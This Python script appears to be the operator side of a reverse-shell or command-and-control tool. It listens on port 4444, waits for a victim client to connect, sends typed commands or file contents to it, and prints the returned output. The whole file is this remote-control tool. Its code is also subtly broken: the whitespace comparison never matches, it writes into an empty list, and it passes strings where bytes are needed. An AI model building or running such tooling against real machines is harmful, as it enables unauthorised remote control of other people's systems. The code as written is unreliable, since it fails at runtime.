import socket
import string


def read_from_file(file):
    return_value = ''

    try:
        f = open(file)
        return_value = f.read()

    except FileNotFoundError as e:
        print(e)

    return return_value

def pull_list_from_str(input):
    return_list = []
    location = 0
    for c in input:
        if(c == string.whitespace):
            location += 1
        else:
            return_list[location] += c

    return return_list



HOST = 'localhost'
PORT = 4444

server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')


while True:
    command_list = pull_list_from_str(input('Enter Command : '))
    if len(command_list) == 1:
        client.send(command_list[0])
    elif len(command_list) > 1:
        client.send(read_from_file(command_list[1]))
    else:
        print('Could not interpret command.')

    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")



